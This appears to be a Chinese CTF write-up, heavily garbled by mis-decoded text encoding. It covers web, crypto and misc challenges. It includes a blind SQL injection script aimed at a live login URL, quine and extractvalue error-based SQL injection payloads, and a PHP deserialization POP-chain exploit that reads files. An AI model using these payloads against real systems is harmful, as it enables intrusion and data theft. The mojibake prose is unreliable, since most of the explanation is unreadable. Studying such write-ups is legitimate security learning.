äº†ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ç±»ä¼¼çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠè„šæœ¬æ”¹ä¸€ä¸‹æ‹¿æ¥ç”¨ï¼Œexp: 123456789101112131415161718192021222324import requestsimport stringstrs = string.printableurl = &quot;http://1.14.71.254:28030/login.php&quot;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: payload = &quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#%&quot;.format(name+j) data = &#123; &quot;username&quot;: &quot;bilala&quot;, &quot;passwd&quot;: payload &#125; r = requests.post(url=url, data=data) if &quot;wrong&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break è·‘å‡ºå¯†ç ï¼š 1b2f2d15b3ae082ca29697d8dcd420fd7 ç™»å½•åå‘ç°æ˜¯æºç ï¼Œå®¡è®¡ä¸€ä¸‹é‡ç‚¹éƒ¨åˆ†ï¼š 1234567891011if ($row[&#x27;passwd&#x27;] === $password) &#123; if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123; show_source(__FILE__); die; &#125; else&#123; die($FLAG); &#125;&#125; else &#123; alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);&#125; è¿™é‡Œæ˜¯ç¬¬äº”ç©ºé—´çš„ä¸€é¢˜æ”¹çš„ï¼Œæ²¡åšè¿‡è¿™é¢˜æ‰€ä»¥å½“æ—¶æ²¡åšå‡ºæ¥ã€‚è¿™é‡Œçš„è€ƒç‚¹æ˜¯quineæ³¨å…¥ï¼Œè¿™æ³¢å­¦ä¹ äº†ã€‚ å…·ä½“åŸç†å¯ä»¥å‚è€ƒè¿™å‡ ç¯‡æ–‡ç« ï¼šSQLi Quineç¬¬äº”ç©ºé—´ 2021â€”â€”yet_another_mysql_injection æ ¸å¿ƒæ€æƒ³å°±æ˜¯è®©sqlè¯­å¥æ‰§è¡Œçš„ç»“æœç­‰äºsqlè¯­å¥æœ¬èº«ï¼Œæ¥ç»•è¿‡è¿™ä¸ªéªŒè¯ã€‚ç›´æ¥ç”¨ä¸Šé¢æ–‡ç« çš„payloadæ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œç”±äºchar()è¢«è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡chr()æˆ–0xæ›¿ä»£ã€‚ payloadï¼š 1username=bilala&amp;passwd=&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;,CHR(34),CHR(39)),CHR(63),&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;)/**/AS/**/a# åæ¥æˆ‘ä¹Ÿæ‰¾åˆ°ä¸€ä¸ªexpå¯ä»¥ç”Ÿæˆè¿™ç±»payloadï¼š 123456789101112def quine(data, debug=True): if debug: print(data) data = data.replace(&#x27;!!&#x27;,&quot;REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)&quot;) blob = data.replace(&#x27;!!&#x27;,&#x27;&quot;!&quot;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&quot;&#x27;) data = data.replace(&#x27;!!&#x27;,&quot;&#x27;&quot;+blob+&quot;&#x27;&quot;) if debug: print(data) return data&quot;&quot;&quot;!!å¡«å……çš„ä¸œè¥¿æ‰§è¡Œå®Œä¹‹åå’Œdataä¸€æ ·&quot;&quot;&quot;data=&quot;&#x27;/**/union/**/select(!!)#&quot;quine(data) join-usç™»å½•é¡µé¢ä¸­å­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿™ä¸ªwafååˆ†ä¹‹ç‹ ï¼Œä¸è¿‡orä¹Ÿè¢«è¿‡æ»¤ä»¥åŠé¢˜ç›®çš„åå­—éƒ½ç»™æˆ‘ä»¬æç¤ºï¼Œå¯èƒ½æ˜¯æ— åˆ—åæ³¨å…¥ã€‚ ä½†æ˜¯æˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“åº“åï¼Œè€Œasè¢«è¿‡æ»¤äº†ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ— æ³•é€šè¿‡database()çš„æ–¹å¼è·å–åº“åï¼Œæˆ‘å½“æ—¶ä¹Ÿå¡åœ¨è¿™äº†ã€‚çœ‹äº†wpå‘ç°è¿™é‡Œè¦åˆ©ç”¨æŠ¥é”™æ¥è¿›è¡Œçˆ†åº“ï¼Œpayloadï¼š 1-1&#x27; || (select*from aa)# å¾—åˆ°å›æ˜¾ï¼š 1Table &#x27;sqlsql.aa&#x27; doesn&#x27;t exist åº“åä¸ºsqlsql æ¥ç€ç”¨extractvalueæŠ¥é”™æ³¨å…¥è·å–è¡¨åï¼Œpayloadï¼š 12-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 0x73716c73716c)))#//è¿‡æ»¤çš„æ˜¯or ï¼Œå¹¶éor è¡¨åä¸ºFal_flagå’Œoutputã€‚å‘çˆ¹çš„æ˜¯flagåœ¨outputä¸­ã€‚ è¿™é‡Œç”±äºcolumnè¢«è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•æŸ¥è¯¢åˆ—åï¼Œä½¿ç”¨joinæ— åˆ—åæ³¨å…¥æŸ¥åˆ—åï¼Œpayload: 1-1&#x27; || extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))# åˆ—åä¸ºdata æœ€åæŠ¥é”™æ³¨å…¥é…åˆmidæˆªæ–­å¾—åˆ°flagï¼Œpayloadï¼š 123-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),1,20)))#-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),21,40)))# babyserializeä¸‹ä¸ªæœˆæ¶è¡¥è¦çš„popé“¾ï¼Œè¿™é¢˜éš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œåˆšå¥½æ‹¿æ¥ç»ƒæ‰‹ç”¨ã€‚ å®¡è®¡æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081 &lt;?phpinclude &quot;waf.php&quot;;class NISA&#123; public $fun=&quot;show_me_flag&quot;; public $txw4ever; public function __wakeup() &#123; if($this-&gt;fun==&quot;show_me_flag&quot;)&#123; hint(); &#125; &#125; function __call($from,$val)&#123; $this-&gt;fun=$val[0]; &#125; public function __toString() &#123; echo $this-&gt;fun; return &quot; &quot;; &#125; public function __invoke() &#123; checkcheck($this-&gt;txw4ever); @eval($this-&gt;txw4ever); &#125;&#125;class TianXiWei&#123; public $ext; public $x; public function __wakeup() &#123; $this-&gt;ext-&gt;nisa($this-&gt;x); &#125;&#125;class Ilovetxw&#123; public $huang; public $su; public function __call($fun1,$arg)&#123; $this-&gt;huang-&gt;fun=$arg[0]; &#125; public function __toString()&#123; $bb = $this-&gt;su; return $bb(); &#125;&#125;class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;; public function __set($name, $value) &#123; $this-&gt;$name=$value; if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123; strtolower($this-&gt;a); &#125; &#125;&#125;if(isset($_GET[&#x27;ser&#x27;]))&#123; @unserialize($_GET[&#x27;ser&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;//func checkcheck($data)&#123;// if(preg_match(......))&#123;// die(something wrong);// &#125;//&#125;//function hint()&#123;// echo &quot;.......&quot;;// die();//&#125;?&gt; å‡ºå£å¾ˆæ˜æ˜¾æ˜¯NISAç±»ä¸­çš„__invoke()ï¼Œå…¥å£ä¹Ÿæ˜¾ç„¶åº”è¯¥é€‰æ‹©TianXiWeiç±»ä¸­çš„__wakeup()ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ„é€ é€»è¾‘é“¾æ¡ï¼š 1TianXiWei:__wakeup() --&gt; Ilovetxw:__call() --&gt; four:__set() --&gt; Ilovetxw:__toString() --&gt; NISA:__invoke() ç”±äºwafå¯¹å±é™©å‡½æ•°çš„è¿‡æ»¤ï¼Œè¿™é‡Œè¦åˆ©ç”¨phpåŸç”Ÿç±»æ¥è¯»å–ï¼Œç”¨GlobIterator(\\&quot;/f*\\&quot;)æ¥è¯»å–æ–‡ä»¶åï¼Œå†ç”¨SplFileObject(&quot;php://filter/convert.base64-encode/resource=/fllllllaaag&quot;)æ¥è¯»å–æ–‡ä»¶ã€‚ expï¼š 12345678910111213141516171819202122232425262728&lt;?phpclass NISA&#123; public $fun=&quot;mrl64&quot;; public $txw4ever=&quot;echo new SplFileObject(\\&quot;php://filter/convert.base64-encode/resource=/fllllllaaag\\&quot;);&quot;;&#125;class TianXiWei&#123; public $ext; public $x=&quot;sixsixsix&quot;;&#125;class Ilovetxw&#123; public $huang; public $su;&#125;class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;;&#125;$N1 = new NISA();$I1 = new Ilovetxw();$I1-&gt;su = $N1;$f1 = new four();$f1-&gt;a = $I1;$I2 = new Ilovetxw();$I2-&gt;huang = $f1;$T1 = new TianXiWei();$T1-&gt;ext = $I2;echo urlencode(serialize($T1));?&gt; Cryptorrssaa1ç»™äº†ä¸ªexeæ–‡ä»¶ï¼Œæç¤ºå½“æ˜æ–‡ç­‰äºæ˜æ–‡ï¼Œåˆç»™äº†ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªcçš„å€¼ã€‚æœ‰ç‚¹æ‡µï¼Œè¿™æ˜¯rsa? åé¢æç¤ºå¯ä»¥pythonåç¼–è¯‘exeæ–‡ä»¶ï¼Œå‘ç°æ˜¯cbcåŠ å¯†ï¼Œå¹¶ä¸”ç»™äº†ivï¼Œæ ¹æ®æ˜æ–‡ç­‰äºå¯†æ–‡ï¼Œæˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š å°†IVä½œä¸ºç¬¬ä¸€ç»„æ˜æ–‡è¾“å…¥ï¼Œè¿™æ ·å¼‚æˆ–å‡ºçš„å°±æ˜¯ä¸€ç»„0å˜é‡ï¼Œå†å°†0å˜é‡åŠ å¯†åçš„å¯†æ–‡åˆ†ç»„ä½œä¸ºç¬¬äºŒæ¬¡çš„æ˜æ–‡è¾“å…¥ï¼Œè¿™æ ·ç¬¬äºŒç»„çš„å¼‚æˆ–å‡ºçš„ä»æ˜¯ä¸€ç»„0å˜é‡ï¼Œè¿™æ ·å¾—åˆ°çš„å¯†æ–‡åˆ†ç»„å’Œæ˜æ–‡åˆ†ç»„å°±æ˜¯ä¸€æ ·çš„ã€‚ å¾—åˆ°10ç»„nã€eçš„å€¼ï¼Œè¿™é‡Œå°±å¾ˆæ˜æ˜¾æ˜¯å…±è§£å¯†æŒ‡æ•°æ”»å‡»äº†ï¼Œexp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//sagefrom gmpy2 import mpzfrom Crypto.Util.number import *def common_private_attack(instance, debug=0, algo=&quot;LLL&quot;): r = len(instance) instance.sort(key=lambda x: x[&#x27;n&#x27;]) M = isqrt(instance[r-1][&#x27;n&#x27;]) # Build up Lattice basis B B = zero_matrix(r+1) B[0,0] = isqrt(instance[r-1][&#x27;n&#x27;]) for i in range(1, r+1): B[0,i] = instance[i-1][&#x27;e&#x27;] B[i,i] = - instance[i-1][&#x27;n&#x27;] if debug: print(&quot;The basis of the lattice we build is:&quot;); print(B) if algo == &quot;LLL&quot;: print(&quot;Performing LLL reduction...&quot;); B = B.LLL(); print(&quot;Done.&quot;) elif algo == &quot;BKZ&quot;: print(&quot;Performing BKZ reduction...&quot;); B = B.BKZ(block_size=len(instance)); print(&quot;Done.&quot;) dM = B[0,0]; d = dM // M; d = abs(d) #print(&quot; dM = &#123;&#125; \\n d = &#123;&#125;&quot;.format(dM, d)) if dM % d != 0: print(&quot;Fail to attack these instances.&quot;) return d instance=[&#123;&#x27;n&#x27;: 22910513874693731529794699437442585462797081074103281779720083438061943013290432867011373716709417770312374751929375184399034771058269694856532799959667041949121677104962602483584220375066079604310070170092110918929461013245513822473684968402351301685536123078521742332569393464306987452108453769431731102270963491458275901025886934456519659607039590731813386955268927981582044269612552247646692665197630976125168347209436275087984418329250553880615465123204025637362363070467484414411836736730245255823697709223006295849021945454748749818267833284501738496721945926714238227282740984681203937986318475852613929143251, &#x27;e&#x27;: mpz(418124818904584070636620437710361776090108506722591991514327934718784299737047502474085855254559869088800261398118869672209434420120317794653495668931393612406838516073527165572665005311548385479495512125271138526092300831851385800096274657668272325217430873751117716114419867692780958968593067192631486465423296524872397276474537511163042204868149575744589259544051450221302783320687258509440413868395816339688622906116768142782258988907394078830699053778292652215833104980849507933199494718914518742424146673598276155185664130838758323044619387740517935666414486691281183770077399065117822052210868255904129790857)&#125;, &#123;&#x27;n&#x27;: 24372481233234868877240458155800588580812953522873807226302786080581993950256157944642464867939762785144387544453522937931896100733484147952058102175740010137587724723034224506078443611576936256666765665550805512133208920980958204618194835347188290890392310460401576052448288739131559585387573534907086475030543828004657399151430511548607561670043211239782273890775589109913476784232834837759148258891293128608842072813994609343360665814202983846428806925879491443490368367467031496582975802337035122899501568440236021091854147442105515442233972362265981345047688567838639803532996157470683787433310033185814953656983, &#x27;e&#x27;: mpz(19143210339300240201214681568913908802203503378911354545783039851820649892001553640716724601777727911454833349588457910280062957963591589075572961361180751463216343846048742052319037925338897041933549452371741246029630187856751307559582731572601728128923668396302767081553351715263257018622487964555758751394847916982565081947216610481734739374914343623808948309951213792814166136267321554178708974135800594894999474676582468832744187994651063639342955574804522901017010028411977615943713171646182786270245242731511044090824221392904310116952767116375673790524507805832568864433094351529367145180574506758961891723713)&#125;, &#123;&#x27;n&#x27;: 24679015975199035427851554685850831633070053899857418484328145060044137550417808217226266986645286514288875260824299646109417892815567800404597047275827535258493172074535206108309907723199659370694192036854964007484633842788093367827915513408997725200824738313725110004104110062857308871076565274842616810840840810744799197704524580056030433553354133397041717795975389389238167191396628898787682599806871009262885431040360774734536368609797684355652388715712552700783779991265411167252723184924189561560018768009199749473695337780587873810629536482188724130484987746341109701417010165543419592212024193621264862157437, &#x27;e&#x27;: mpz(1887466323771244506126050040652897884230288720026513972534347995161387672855941521729593627560537130159609645850851312546802205326329236157151902749914059157236234397788369920413655818810511725066749956880552355520230065767054687221730528133402180824270938119599446091654881896367427441429406021700330179507358460436236173403829804136590987361179940109750138029351494643114058319058124904762608681397348022925627376074826811350518080031530194579924378909569680695196260687073292527268362345061093483687699693119108452554448873156890231817232965303834553227987138777939162459009424732328429033584600222583239341864361)&#125;, &#123;&#x27;n&#x27;: 20725846433298459818738516063389861157454145887412567309241971368192930248390172552460032176060600040992720084753747686885177277168920132042523397036270405823908393368295992028165872545209655962017977363348351903746731605928564721934116632473077039008788587133825619811922502829333793026171268937670512542626155796001634809633664680547300701846259322677726234892599145592757089259403977732051835633093448559478273833139316384288698135960343103244801500564407369891836897783914804945533546962961701061687990485508696254709609957808586842087409899693206392569585425380859078318139127000550432581295099509030669863867303, &#x27;e&#x27;: mpz(2363237573854087670976417969883225633360397442974401061049216894475393422244866973952932756882139865641894504435941506895224713566917990611214046823492289837152901617831851336386026240304485783973236642121278289706255550485010385013170275793369386007680778694579559138881420935348763388540214604799462174889474198144497241133628301258759734097809090228161716735359351895750148751120435424528229013305162159696839414242261305275449518850079365302566268954286580666577767306164857063096608849641777683700226797033332925301661913694775501692542844702513650655471083144015543032647455807221102876601998869281360384396969)&#125;, &#123;&#x27;n&#x27;: 22809935750576912865959231885839360732534906212225458022717669424614748661511918579549919916493236188484439882038298212760793306304545526844216353471055053556871150974522878690375438562426087440233386393370359683872593815943709353082095631111639041143754373874991575027747570017739942341766604387224176018793894754930878629709819661862381387213173036726945372240282580901124702248064018648150065273248946129523748193672656981316427317060071759239832204248176611648685460398874668097756975672168707026506110403992926074215511420161013025697858596735206101616761571190864709956992427309041192147394141071079459513490611, &#x27;e&#x27;: mpz(13133555776569547650925045548918236939639526554394889895596620269739174476566352794864343622356222299566279371551432530070481257368316784755930075662834731500502345517682356361164582999060502872211361694222132015741819795145796909591665107893860146356770485006797484186247196345168223924741037976946102849578524579606338846422314675808836631910676758185839828694899691695652500538122088029311150940192651185968892410331308490420642197863628213020528562440239348622456640781055180466849084742096007240725499537008098270708800128906741434883430906389880429863171839180158004739621168711466811317518568593570244234356473)&#125;, &#123;&#x27;n&#x27;: 22480694282480941856240478144806308314675949068465587320650365753607181629359667506510327246960059600070975543193248132715947284941641953388046978099792445163848997480222534711956558077424201889790307253643733334819206791789849391745265354084064007637913171566532460998684708503229350236485373560557693046199065144657259010989119048370619489811662974589653263692671635131186093439219165642237949026744612661967562816404233890288374130410997771410589750213626670311839445013864803976998563166191406408874373459540505835186973304663516643096962903654014842811813401296109284028861941906109336060451132312463266201415329, &#x27;e&#x27;: mpz(5624874560950753498859866139527579818312781394539479470831958979447428570824824324740771269291165645086210973103272336121731912398585096517141753168417402556661950218674390872421989641336537837013066620791238206533730906030501700325503296214297695138747177011202671679049512237059817685651828933521719416294029149562504049154660843723718018891705220638761705284473974644590524030504330156413475638165884760254514165992618015237764971157843554639068828315161344021009639686458808898375286838635679965954906305612625538770521388361497066840616893440392969988298775795541575848039950165133743457112710681254111761236977)&#125;, &#123;&#x27;n&#x27;: 24864800348158528479906787630817628786057394652940528220487672878224821093187748399176495638492155238253951061624119446159699883923429845058879913539518385471765492064482097277790223293260128881959273708226181373995800760490076615976367890263392717551259059978955019671550523682528756210608945906533001192976007098872901938952015131822528777969231670678207075524375456230663716322781932990075477736910925180207286309477685449506037405249527178078075985163439166820012435973787796791138399698319190416826416307419995704905995638505495443894477749261164124960538410932525360254583333096355932627999150017132814090333241, &#x27;e&#x27;: mpz(3856630503719827855844626836485236690181435414315645355130063964022152923723080539565019021355419177735019322219325830072037487528940021907267513161749071974608699933871793463562863522229082468683243901644845826059349596659323042299690790765030373981718166011819585074704820443905345396257414353837002151781007668563125603659889904298805297904725270532210911911226283011734773982797544816536205681843451163076486100161244600813341737446527784779893709854495658416561649974958835452357349125453415490361795100092166500410617267171431892907868601018198501626162578176872991772913847456399112257982770466218683435977233)&#125;, &#123;&#x27;n&#x27;: 19124038956715221534475664748050443644784017946285501767743851038866178811578425211712395772512764081657114249264750411100125353521253413105314358045769042565775171832528505858934347564408448715726606220509887643736405686485259106596314428705429329567823354848621662213427380804714681617624381700294984971221298888824492282135460743333840937811577196086176023601621687706265164503993591934717195202747810262431964418069040376377368805912956880604436193067845497931435910276011392268756936356824924016508042574993560735189920618883256138946496688867855672114401245107938884098540558998467042804767676383399885670917863, &#x27;e&#x27;: mpz(2526864429486600013372544534422176076310449606548856304461485276066637941365632554754458596530587265120176820669070912170194561174897463295107537549901995199720429699901644961145517761531066171228894272527951311393341049801262112401226497042253995829727117709996063274895247764121887846333559590006675066290762310586706087473986643091625437211817626727787839725750573398738378173014091184388786245327948372467755559879615874741522637847583054177607416293895012819765959700604109526983132083773582729514355334522134224212163590455593583898122500139694022270117330389492890927144273267138493069027225729811456941196841)&#125;, &#123;&#x27;n&#x27;: 22712694846618225919656596038340253703950387189307356916884965227715575385290510648357788918083042127579214343856073731099014236390909368166091091105572503659963582091256239405080287823086072151464554676361316498173485846962725704572373404896028400947773894219506964827695493355671062126899085653349150889714833678676595701733978080393121447152690832437658688817450477965220947545046095740313522911930620442467826353136237204001953779248526332341778622938019495861382365118525764027553983694265494431463871584823902011764736743452157607708114643621663013938789045186398065113397082412393217306851766751359748485479947, &#x27;e&#x27;: mpz(10677712174622673625461359647500782439433165156123940439219715020101430663583415600108354143755028037935813256146383342375176716193336557365518193617245378776772825370333872189153024262271406627376370626366265587010646777359582552203727155755566858670727867097618066172109680249978907948880949039026897280024621775610018299977269676137246768591695700091958272943505065479321506848835565663826406807954755395641654795735858484165741728341231569210806669852646070268250158341835400267707050630955072247788775265007770528881479089247519947243736784181303650218623544794991471865627967303089855830890716351172499822666657)&#125;, &#123;&#x27;n&#x27;: 29530501528048179618993188667259709438380823126457692419992781599742162976314963077892631687601059594978412657041475380032477805818407564226390560549020301725312531169814413208353912738658672008557076821628601123546429396788497410673839196924586021049176714044555896053623390330789641538577117351494577537192456906989432523245836053774828613790929239698312653550748067411624343544340442517761647170791413344362742142440328926448233820806068777032405586400091222100390759969032135228099677059219202752058583088660274632343174038249349622867356306772975206078721974271500052236762769794504351873161093377781217621800851, &#x27;e&#x27;: mpz(8729173604239025011857782023927738952041674447805777183092178780381283882428344889128776928009726731687565885792801585411233568278521882651010769203046279626441420751041892471066965129701726335998417117456164919970929625892898165284166374265463104192123359891593075186135067029442765544980841269006919805416544688157191347297531124766371177370618922502642426517831690685654226275590626523865698087716363119573077628586230380384786269088962223486145179686564375420888574395904747308189390860655468787526259462696913684329894120410714757458285565733273719525515391646880556812753596710689221817572185451401270933654073)&#125;] c=mpz(8249481061276641012500781695740094434470113414066017209484215230041921646049458178370330794241115341376535075017119365874406375409425518256323024908492829783852428861824372134924435528670473416419205178211753257025999328702024596957043540125702709160006013219820565345682050977792920885144964033305130028650810667051301594273570335413667926122212987004423933365573720187183851963886897210680516485876928056049295497627661890470786325640353389624242623725312661098422286151242366448450478297382717820442653339243537262050892660153070690559134669225520213623348774988576340953811305002965060069852345476309887418617950) d=common_private_attack(instance)for i in range(0,11): n=instance[i][&#x27;n&#x27;] m1=pow(c,d,n) m=long_to_bytes(m1) if b&#x27;NSSCTF&#x27; in m: print(m) break else: i+1 rrssaa2å’Œé—½ç›¾æ¯é‚£é¢˜çˆ†é›¶å¯†ç ä¸€æ ·çš„è€ƒæ³•ï¼Œeä¸phiä¸äº’è´¨ï¼Œå¹¶ä¸”éœ€è¦ammå¼€æ ¹è¿ç®—ï¼Œæºç ï¼š 12345678910111213141516171819202122from Crypto.Util.number import *import randomimport libnumimport gmpy2def gen(): p = 1801 * random.getrandbits(1012) + 1 while not isPrime(p): p = 1801 * random.getrandbits(1012) + 1 return pp=gen()q=gen()e=1801n=p*qflag=&#x27;NSSCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;flag=flag+&#x27;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;c = pow(m, e, n)print(&#x27;e=&#x27;,e)print(&#x27;p=&#x27;,p)print(&#x27;q=&#x27;,q)print(&#x27;c=&#x27;,c) ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå‘çˆ¹çš„åœ°æ–¹ï¼Œé—½ç›¾é‚£ä¸ªè„šæœ¬ä¸­çš„kå’Œè¿™æ¬¡çš„kæœ‰åŒºåˆ«ï¼Œä¸èƒ½ç›´æ¥å¥—ï¼Œå› æ­¤è¦æ”¹ä¸‹exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import randomimport timedef cal_k(s, r): R.&lt;x&gt; = PolynomialRing(GF(r)) f = x * s + 1 k = int(f.roots()[0][0]) print(k) return k# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = cal_k(s, r) alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - dicreat_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpe= 1801p= 49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841q= 21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043c= 601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199cp = c % pcq = c % qmp = AMM(cp, e, p)mq = AMM(cq, e, q)p_proot = findAllPRoot(p, e)q_proot = findAllPRoot(q, e)mps = findAllSolutions(mp, p_proot, cp, p)mqs = findAllSolutions(mq, q_proot, cq, q)print(mps, mqs)def check(m): h = m.hex() if len(h) &amp; 1: return False if bytes.fromhex(h).startswith(b&#x27;NSSCTF&#x27;): print(bytes.fromhex(h)) return True else: return False# About 16 mins to run 0x1337^2 == 24196561 times CRTstart = time.time()result = []print(&#x27;Start CRT...&#x27;)for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) result.append(bytes.fromhex(solution.hex())) print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))print(&quot;result:&quot;, result) Miscå¥—å¨ƒè¿™æ¬¡miscæ„Ÿè§‰å°±è¿™é“å–è¯å€¼å¾—è¯´é“è¯´é“ï¼Œå…¶ä»–çš„é¢˜ä¸æ˜¯å¤ªç®€å•å°±æ˜¯è‡ªå·±çŠ¯è ¢æ²¡æƒ³å‡ºæ¥ï¼Œè¿™é¢˜è¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ã€‚ filescanæœç´¢ï¼Œå‘ç°å¯ç–‘zipæ–‡ä»¶ï¼Œæå–å‡ºæ¥åé‡Œé¢æœ‰ä¸€ä¸ªpwd.txtå’Œä¸€ä¸ªimage.rarä¸¤ä¸ªæ–‡ä»¶ï¼Œå‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ï¼Œå¯†ç åº”è¯¥å°±æ˜¯pwdé‡Œé¢çš„å†…å®¹äº†ã€‚ pwd.txtï¼š 1KVKFMU2NNN4HKTJSGVGWGVSWOVKVORSKKZUUCZY= è¿™é‡Œåšäº†ä¸ªå¥—å¨ƒï¼Œä¸€ä¸ªbase32ï¼Œä¸€ä¸ªbase64ï¼Œè€Œæœ€åä¸€ä¸ªæ˜¯æ¢è¡¨base64ï¼Œç”¨CyberChefå¯ä»¥è§£é™¤æœ€åçš„å¯†ç ï¼š 1pwD_1s_h3re! è§£å‹åå‘ç°æ˜¯ä¸€å †å›¾ç‰‡ï¼Œé™„ä»¶é‡Œè¿˜æœ‰ä¸ªarray.txtï¼ŒåŒæ ·ä¹Ÿå¥—äº†å‡ å±‚ç¼–ç ï¼Œunicode+base64+base32+hexï¼Œè§£å‡ºæ¥ä¸€ä¸ªæ•°ç»„ï¼š 132, 24, 6, 28, 15, 31,7, 23, 13, 27, 30, 33,12, 8, 5, 26, 29, 16,34, 22, 2, 14, 9, 17,21, 1, 19, 10, 4, 36,35, 25, 11, 20, 3, 18 å‘ç°åˆšå¥½å’Œå›¾ç‰‡æ•°é‡å»åˆï¼Œåº”è¯¥å°±æ˜¯æ‹¼å›¾é¡ºåºäº†ï¼Œå¯ä»¥å†™è„šæœ¬ï¼Œä½†æ˜¯æˆ‘èœä¸ä¼šå†™å°±æ‰‹æ‹¼äº†ï¼Œåæ­£ä¸å¤šï¼Œè¿™é‡Œè´´ä¸ªwpé‡Œçš„expï¼š 12345678910111213141516171819202122from PIL import Imagename_list = [[32, 24, 6, 28, 15, 31], [7, 23, 13, 27, 30, 33], [12, 8, 5, 26, 29, 16], [34, 22, 2, 14, 9, 17], [21, 1, 19, 10, 4, 36], [35, 25, 11, 